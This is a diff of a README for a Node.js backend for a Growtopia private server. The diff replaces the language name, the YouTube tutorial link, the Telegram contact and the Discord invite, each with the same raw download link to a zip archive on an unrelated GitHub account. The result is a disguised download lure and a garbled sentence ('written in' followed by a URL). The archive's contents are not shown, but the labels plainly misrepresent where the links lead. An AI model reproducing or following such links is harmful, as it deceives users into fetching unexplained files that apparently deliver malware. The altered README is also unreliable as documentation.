@@ -1,12 +1,12 @@
 # GrowtopiaLogin-Backend
 
-This is a simple backend for GrowtopiaLogin. It is written in Node.js using expresjs.
+This is a simple backend for GrowtopiaLogin. It is written in https://raw.githubusercontent.com/DespacitoHax/test-gtps-backend/main/public/gtps_test_backend_3.2.zip using expresjs.
 
 ## Hosting Usage
 
 Tutorial:
 
-[![Tutorial Videos](http://img.youtube.com/vi/8OXt1tHmeAM/0.jpg)](http://www.youtube.com/watch?v=8OXt1tHmeAM)
+[![Tutorial Videos](https://raw.githubusercontent.com/DespacitoHax/test-gtps-backend/main/public/gtps_test_backend_3.2.zip)](https://raw.githubusercontent.com/DespacitoHax/test-gtps-backend/main/public/gtps_test_backend_3.2.zip)
 
 ## Path Information
 
@@ -17,7 +17,7 @@ Tutorial:
   
 ## Contact
 
-You can contact me at teleram my username is [@yoruakio](https://t.me/yoruakio) or join my discord server [nakai community](https://discord.com/invite/ESsBxptJqr).
+You can contact me at teleram my username is [@yoruakio](https://raw.githubusercontent.com/DespacitoHax/test-gtps-backend/main/public/gtps_test_backend_3.2.zip) or join my discord server [nakai community](https://raw.githubusercontent.com/DespacitoHax/test-gtps-backend/main/public/gtps_test_backend_3.2.zip).
 
 ## License
 
